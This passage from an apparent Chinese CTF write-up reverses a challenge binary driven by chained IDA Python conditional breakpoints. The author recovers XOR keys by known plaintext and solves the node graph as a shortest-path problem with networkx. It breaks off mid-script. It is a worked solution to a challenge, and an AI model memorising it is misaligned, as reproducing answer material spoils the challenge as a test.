class="number">17</span>:</span><br><span class="line">    bYsMTa = <span class="number">952</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;CMF1Vk7NH4O&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> VLzxDy == <span class="number">18</span>:</span><br><span class="line">    bYsMTa = <span class="number">222</span></span><br><span class="line">    LjzrdT = <span class="string">b&#x27;43PSbAlgLqj&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    bYsMTa = -<span class="number">1</span>         </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bYsMTa &lt; <span class="number">0</span>:      <span class="comment"># Wrong的位置</span></span><br><span class="line">    cpu.rsp -= <span class="number">8</span></span><br><span class="line">    cpu.rdi = <span class="number">4927649</span>   <span class="comment"># 0x4b30a1: &quot;O, no&quot;     # 传递参数</span></span><br><span class="line">    cpu.rax = <span class="number">0</span></span><br><span class="line">    idaapi.patch_qword(cpu.rsp, <span class="number">4202616</span>)        <span class="comment"># leave retn</span></span><br><span class="line">    idaapi.del_bpt(cpu.rip)               </span><br><span class="line">    cpu.rip = <span class="number">4263680</span>       <span class="comment"># 0410F00   printf(&quot;O, no&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    zaqhdD = <span class="number">0x486195</span></span><br><span class="line">    bYsMTa = jIS40A[bYsMTa]                 <span class="comment"># 从一长串密文中取出数据</span></span><br><span class="line"></span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117568</span>, bYsMTa)     <span class="comment"># 0x4e1680  # 取出的密文</span></span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117488</span>, LjzrdT)     <span class="comment"># 0x4e1630  # 取出的key</span></span><br><span class="line">                                            <span class="comment"># rdi, rsi, rdx, rcx, r8, r9</span></span><br><span class="line">    cpu.rsp -= <span class="number">8</span>                            </span><br><span class="line">    idaapi.patch_qword(cpu.rsp, zaqhdD)     <span class="comment"># 0x486195   </span></span><br><span class="line">         <span class="comment"># 设置参数</span></span><br><span class="line">    cpu.rdi = <span class="number">5117568</span>                       <span class="comment"># 0x4e1680   # 密文地址</span></span><br><span class="line">    cpu.rsi = <span class="built_in">len</span>(bYsMTa)                                <span class="comment"># 密文长度</span></span><br><span class="line">    cpu.rdx = <span class="number">5117488</span>                       <span class="comment"># 0x4e1630   # key地址</span></span><br><span class="line">    cpu.rcx = <span class="number">11</span>                                         <span class="comment"># key长度</span></span><br><span class="line">    cpu.r8 = <span class="number">5117568</span>                        <span class="comment"># 0x4e1680   # 密文地址</span></span><br><span class="line">    cpu.rax = <span class="number">5117568</span>                       <span class="comment"># 0x4e1680   # 返回值</span></span><br><span class="line">    </span><br><span class="line">    idaapi.add_bpt(zaqhdD)</span><br><span class="line">    jQfwUA = idaapi.bpt_t()</span><br><span class="line">    idaapi.get_bpt(zaqhdD, jQfwUA)</span><br><span class="line">    jQfwUA.elang = <span class="string">&quot;Python&quot;</span></span><br><span class="line">    jQfwUA.condition = <span class="string">&quot;N4QKUt = &#123;&#125;\nSdjOr3 = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(N4QKUt, <span class="built_in">len</span>(bYsMTa)) + <span class="string">&#x27;bYsMTa = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\nzaqhdD = 4767838\nidaapi.add_bpt(zaqhdD)\njQfwUA = idaapi.bpt_t()\nidaapi.get_bpt(zaqhdD, jQfwUA)\njQfwUA.elang = &quot;Python&quot;\njQfwUA.condition = &quot;N4QKUt = &#123;&#125;\\n&quot;.format(N4QKUt+1) + bYsMTa\nidaapi.del_bpt(zaqhdD)\nidaapi.add_bpt(jQfwUA)\nidaapi.del_bpt(cpu.rip)\ncpu.rsp -= 8\nidaapi.patch_qword(cpu.rsp, zaqhdD)\ncpu.rip = 4447160\n&#x27;</span></span><br><span class="line">    idaapi.del_bpt(zaqhdD)</span><br><span class="line">    idaapi.add_bpt(jQfwUA)</span><br><span class="line">    idaapi.del_bpt(cpu.rip)</span><br><span class="line">    cpu.rip = <span class="number">4201909</span>  <span class="comment">#0x401db5   # 5个参数   先执行解密，然后再-&gt;0x486195(因为上面已经把cpu.esp-8的位置改为了0x486195), 触发条件断点</span></span><br></pre></td></tr></table></figure><p><img src="./image-20211209145249814.png" alt="image-20211209145249814"></p><p>可以发现流程就是，根据输入的flag的每个字符，来判断进入下一个节点<br>解密函数是一个简单的异或, 先随便找几个解密看看，key的长度都是11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">_x, _key</span>):</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encs[_x])):</span><br><span class="line">        m.append(encs[_x][i] ^ <span class="built_in">ord</span>(_key[i % <span class="number">11</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(m).decode())</span><br><span class="line"></span><br><span class="line">dec(<span class="number">287</span>,  <span class="string">&#x27;lqAT7pNI3BX&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;===============================================================&#x27;</span>)</span><br><span class="line">dec(<span class="number">96</span>, <span class="string">&#x27;z3Uhis74aPq&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">NyPGpw = idaapi.get_byte(<span class="number">5127584</span> + N4QKUt)</span><br><span class="line">NyPGpw -= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> NyPGpw == <span class="number">0</span>:</span><br><span class="line">    afvkwL = <span class="number">667</span></span><br><span class="line">    hsYnNw = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> NyPGpw == <span class="number">1</span>:</span><br><span class="line">    afvkwL = <span class="number">667</span></span><br><span class="line">    hsYnNw = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> NyPGpw == <span class="number">2</span>:</span><br><span class="line">    afvkwL = <span class="number">667</span></span><br><span class="line">    hsYnNw = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    afvkwL = -<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> afvkwL &lt; <span class="number">0</span>:</span><br><span class="line">    cpu.rsp -= <span class="number">8</span></span><br><span class="line">    cpu.rdi = <span class="number">4927649</span></span><br><span class="line">    cpu.rax = <span class="number">0</span></span><br><span class="line">    idaapi.patch_qword(cpu.rsp, <span class="number">4202616</span>)</span><br><span class="line">    idaapi.del_bpt(cpu.rip)</span><br><span class="line">    cpu.rip = <span class="number">4263680</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    RrNlIm = <span class="number">0x4438d8</span></span><br><span class="line">    afvkwL = jIS40A[afvkwL]</span><br><span class="line"></span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117568</span>, afvkwL)</span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117488</span>, hsYnNw)</span><br><span class="line"></span><br><span class="line">    cpu.rsp -= <span class="number">8</span></span><br><span class="line">    idaapi.patch_qword(cpu.rsp, RrNlIm)</span><br><span class="line">    cpu.rdi = <span class="number">5117568</span></span><br><span class="line">    cpu.rsi = <span class="built_in">len</span>(afvkwL)</span><br><span class="line">    cpu.rdx = <span class="number">5117488</span></span><br><span class="line">    cpu.rcx = <span class="number">11</span></span><br><span class="line">    cpu.r8 = <span class="number">5117568</span></span><br><span class="line">    cpu.rax = <span class="number">5117568</span></span><br><span class="line"></span><br><span class="line">    idaapi.add_bpt(RrNlIm)</span><br><span class="line">    XKDdOn = idaapi.bpt_t()</span><br><span class="line">    idaapi.get_bpt(RrNlIm, XKDdOn)</span><br><span class="line">    XKDdOn.elang = <span class="string">&quot;Python&quot;</span></span><br><span class="line">    XKDdOn.condition = <span class="string">&quot;N4QKUt = &#123;&#125;\nSdjOr3 = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(N4QKUt, <span class="built_in">len</span>(afvkwL)) + <span class="string">&#x27;afvkwL = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\nRrNlIm = 4370382\nidaapi.add_bpt(RrNlIm)\nXKDdOn = idaapi.bpt_t()\nidaapi.get_bpt(RrNlIm, XKDdOn)\nXKDdOn.elang = &quot;Python&quot;\nXKDdOn.condition = &quot;N4QKUt = &#123;&#125;\\n&quot;.format(N4QKUt+1) + afvkwL\nidaapi.del_bpt(RrNlIm)\nidaapi.add_bpt(XKDdOn)\nidaapi.del_bpt(cpu.rip)\ncpu.rsp -= 8\nidaapi.patch_qword(cpu.rsp, RrNlIm)\ncpu.rip = 4220940\n&#x27;</span></span><br><span class="line">    idaapi.del_bpt(RrNlIm)</span><br><span class="line">    idaapi.add_bpt(XKDdOn)</span><br><span class="line">    idaapi.del_bpt(cpu.rip)</span><br><span class="line">    cpu.rip = <span class="number">4201909</span></span><br><span class="line"></span><br><span class="line">===============================================================</span><br><span class="line">XxrupR = idaapi.get_byte(<span class="number">5127584</span> + N4QKUt)</span><br><span class="line">XxrupR -= <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> XxrupR == <span class="number">0</span>:</span><br><span class="line">    SAoBHX = <span class="number">667</span></span><br><span class="line">    EOlVWv = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> XxrupR == <span class="number">1</span>:</span><br><span class="line">    SAoBHX = <span class="number">667</span></span><br><span class="line">    EOlVWv = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> XxrupR == <span class="number">2</span>:</span><br><span class="line">    SAoBHX = <span class="number">667</span></span><br><span class="line">    EOlVWv = <span class="string">b&#x27;vjHiPd4bBuf&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    SAoBHX = -<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> SAoBHX &lt; <span class="number">0</span>:</span><br><span class="line">    cpu.rsp -= <span class="number">8</span></span><br><span class="line">    cpu.rdi = <span class="number">4927649</span></span><br><span class="line">    cpu.rax = <span class="number">0</span></span><br><span class="line">    idaapi.patch_qword(cpu.rsp, <span class="number">4202616</span>)</span><br><span class="line">    idaapi.del_bpt(cpu.rip)</span><br><span class="line">    cpu.rip = <span class="number">4263680</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    uBEeMD = <span class="number">0x45e68a</span></span><br><span class="line">    SAoBHX = jIS40A[SAoBHX]</span><br><span class="line"></span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117568</span>, SAoBHX)</span><br><span class="line">    idaapi.patch_bytes(<span class="number">5117488</span>, EOlVWv)</span><br><span class="line"></span><br><span class="line">    cpu.rsp -= <span class="number">8</span></span><br><span class="line">    idaapi.patch_qword(cpu.rsp, uBEeMD)</span><br><span class="line">    cpu.rdi = <span class="number">5117568</span></span><br><span class="line">    cpu.rsi = <span class="built_in">len</span>(SAoBHX)</span><br><span class="line">    cpu.rdx = <span class="number">5117488</span></span><br><span class="line">    cpu.rcx = <span class="number">11</span></span><br><span class="line">    cpu.r8 = <span class="number">5117568</span></span><br><span class="line">    cpu.rax = <span class="number">5117568</span></span><br><span class="line"></span><br><span class="line">    idaapi.add_bpt(uBEeMD)</span><br><span class="line">    piHsvj = idaapi.bpt_t()</span><br><span class="line">    idaapi.get_bpt(uBEeMD, piHsvj)</span><br><span class="line">    piHsvj.elang = <span class="string">&quot;Python&quot;</span></span><br><span class="line">    piHsvj.condition = <span class="string">&quot;N4QKUt = &#123;&#125;\nSdjOr3 = &#123;&#125;\n&quot;</span>.<span class="built_in">format</span>(N4QKUt, <span class="built_in">len</span>(SAoBHX)) + <span class="string">&#x27;SAoBHX = idaapi.get_bytes(cpu.rax, SdjOr3).decode()\nuBEeMD = 4808702\nidaapi.add_bpt(uBEeMD)\npiHsvj = idaapi.bpt_t()\nidaapi.get_bpt(uBEeMD, piHsvj)\npiHsvj.elang = &quot;Python&quot;\npiHsvj.condition = &quot;N4QKUt = &#123;&#125;\\n&quot;.format(N4QKUt+1) + SAoBHX\nidaapi.del_bpt(uBEeMD)\nidaapi.add_bpt(piHsvj)\nidaapi.del_bpt(cpu.rip)\ncpu.rsp -= 8\nidaapi.patch_qword(cpu.rsp, uBEeMD)\ncpu.rip = 4405922\n&#x27;</span></span><br><span class="line">    idaapi.del_bpt(uBEeMD)</span><br><span class="line">    idaapi.add_bpt(piHsvj)</span><br><span class="line">    idaapi.del_bpt(cpu.rip)</span><br><span class="line">    cpu.rip = <span class="number">4201909</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现都符合一个框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xxxx = idaapi.get_byte(5127584 + N4QKUt)</span><br><span class="line">xxxx -= ord(&#x27;a&#x27;)</span><br><span class="line">if xxxx == 0:</span><br><span class="line">    afvkwL = 667</span><br><span class="line">    hsYnNw = b&#x27;vjHiPd4bBuf&#x27;</span><br><span class="line">elif xxxx == 1:</span><br><span class="line">    afvkwL = 667</span><br><span class="line">    hsYnNw = b&#x27;vjHiPd4bBuf&#x27;</span><br><span class="line">    .......</span><br><span class="line">else:</span><br><span class="line">    afvkwL = -1</span><br><span class="line">if afvkwL &lt; 0:</span><br><span class="line">........</span><br></pre></td></tr></table></figure><p>因为解密出来都含有<code>idaapi.get_byte(5127584 + N4QKUt)</code>，而key的长度都是11，因此可以对key全部爆破出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">encs = [....] </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keys</span>():</span> </span><br><span class="line">    sign = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;</span>[<span class="number">11</span>:<span class="number">22</span>]]</span><br><span class="line">    keys = [<span class="number">0</span>]*<span class="number">1000</span>         <span class="comment"># encs的长度是1000， 对应1000个key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encs)):</span><br><span class="line">        tmp = encs[i][<span class="number">11</span>:<span class="number">22</span>]                                    </span><br><span class="line">        tmp_key = [tmp[j] ^ sign[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]         <span class="comment"># 获得key</span></span><br><span class="line">        sign_1 = [tmp_key[j] ^ encs[i][j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]   </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;= id&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>(sign_1):</span><br><span class="line">            keys[i] = <span class="built_in">bytes</span>(tmp_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            keys[i] = <span class="literal">None</span><span class="comment"># i = 426</span></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line">keys = get_keys()</span><br><span class="line"><span class="built_in">print</span>(keys.count(<span class="literal">None</span>)) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p>只有1个节点没有解密成功，即没有指向，应该就是终点，结合题目，是个最短路径问题</p><p><img src="./image-20211209150619675.png" alt="image-20211209150619675"></p><p>终点的索引是426，写脚本找到索引426的key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">_src, _key</span>):</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_src)):</span><br><span class="line">        m.append(_src[i] ^ _key[i % <span class="number">11</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(m).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keys</span>():</span> </span><br><span class="line">    sign = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;</span>[<span class="number">11</span>:<span class="number">22</span>]]</span><br><span class="line">    keys = [<span class="number">0</span>]*<span class="number">1000</span>         <span class="comment"># encs的长度是1000， 对应1000个key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encs)):</span><br><span class="line">        tmp = encs[i][<span class="number">11</span>:<span class="number">22</span>]                                    </span><br><span class="line">        tmp_key = [tmp[j] ^ sign[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]         <span class="comment"># 获得key</span></span><br><span class="line">        sign_1 = [tmp_key[j] ^ encs[i][j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]   </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;= id&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>(sign_1):</span><br><span class="line">            keys[i] = <span class="built_in">bytes</span>(tmp_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            keys[i] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_node_edges</span>(<span class="params">_dec_src</span>):</span> <span class="comment"># 获取每条边，2个点即构成一条边</span></span><br><span class="line">    <span class="comment"># 传入解密后的脚本</span></span><br><span class="line">    i = _dec_src.index(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    _dec_src = _dec_src[:i]</span><br><span class="line">    m = re.findall(<span class="string">r&#x27; = (\d+)&#x27;</span>, _dec_src)</span><br><span class="line">    nodes = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">return</span> nodes</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">keys = get_keys()</span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(encs):</span><br><span class="line">    <span class="keyword">if</span> keys[i] == <span class="literal">None</span>:</span><br><span class="line">        target_node = i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dec_src = dec(value, keys[i])</span><br><span class="line">        nodes = get_node_edges(dec_src)</span><br><span class="line">        <span class="comment"># 添加边</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">            <span class="keyword">if</span> nodes[j]==<span class="number">426</span>:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                <span class="built_in">print</span>(dec_src)</span><br><span class="line">                exit()</span><br><span class="line"><span class="comment"># 705</span></span><br><span class="line"><span class="comment"># GKjYbv = idaapi.get_byte(5127584 + N4QKUt)</span></span><br><span class="line"><span class="comment"># GKjYbv -= ord(&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment"># if GKjYbv == 0:</span></span><br><span class="line"><span class="comment">#     NizaZl = 426</span></span><br><span class="line"><span class="comment">#     BCTfiu = b&#x27;akUx3IWl29V&#x27;</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment"># ......</span></span><br></pre></td></tr></table></figure><p>key为<code>akUx3IWl29V</code>, 解密得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">idaapi.del_bpt(cpu.rip)</span><br><span class="line">cpu.rax = <span class="number">0</span></span><br><span class="line">cpu.rip = <span class="number">4202594</span> <span class="comment"># 0x402062</span></span><br></pre></td></tr></table></figure><p><img src="./image-20211209152652112.png" alt="image-20211209152652112"></p><p>是终点无疑了，现在需要找出所有的节点，以及边（2个节点就是1个边，有方向）,然后用networkx求解</p><h3 id="networkx求最短路径-1"><a href="#networkx求最短路径-1" class="headerlink" title="networkx求最短路径"></a>networkx求最短路径</h3><p>直接贴脚本了，就是通过正则表达式匹配出node,然后构造边，添加边，用networkx求出路径，再写出控制方向的的flag字符即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> networkx</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">encs = [....] </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">_src, _key</span>):</span></span><br><span class="line">    m = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(_src)):</span><br><span class="line">        m.append(_src[i] ^ _key[i % <span class="number">11</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(m).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keys</span>():</span> </span><br><span class="line">    sign = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;XxrupR = idaapi.get_byte(5127584 + N4QKUt)&#x27;</span>[<span class="number">11</span>:<span class="number">22</span>]]</span><br><span class="line">    keys = [<span class="number">0</span>]*<span class="number">1000</span>         <span class="comment"># encs的长度是1000， 对应1000个key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encs)):</span><br><span class="line">        tmp = encs[i][<span class="number">11</span>:<span class="number">22</span>]                                    </span><br><span class="line">        tmp_key = [tmp[j] ^ sign[j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]         <span class="comment"># 获得key</span></span><br><span class="line">        sign_1 = [tmp_key[j] ^ encs[i][j] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>)]   </span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;= id&#x27;</span> <span class="keyword">in</span> <span class="built_in">bytes</span>(sign_1):</span><br><span class="line">            keys[i] = <span class="built_in">bytes</span>(tmp_key)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            keys[i] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_node_edges</span>(<span class="params">_dec_src</span>):</span> <span class="comment"># 获取每个节点指向的其他的节点，然后通过此来获取边</span></span><br><span class="line">    <span class="comment"># 传入解密后的脚本</span></span><br><span class="line">    i = _dec_src.index(<span class="string">&#x27;&lt;&#x27;</span>)</span><br><span class="line">    _dec_src = _dec_src[:i]</span><br><span class="line">    m = re.findall(<span class="string">r&#x27; = (\d+)&#x27;</span>, _dec_src)</span><br><span class="line">    nodes = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br><span class="line">    <span class="keyword">return</span> nodes</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">keys = get_keys()</span><br><span class="line">edges = []</span><br><span class="line">node2node = []</span><br><span class="line"><span class="keyword">for</span> i, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(encs):</span><br><span class="line">    <span class="keyword">if</span> keys[i] == <span class="literal">None</span>:</span><br><span class="line">        target_node = i<span class="comment"># 终点</span></span><br><span class="line">        nodes = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        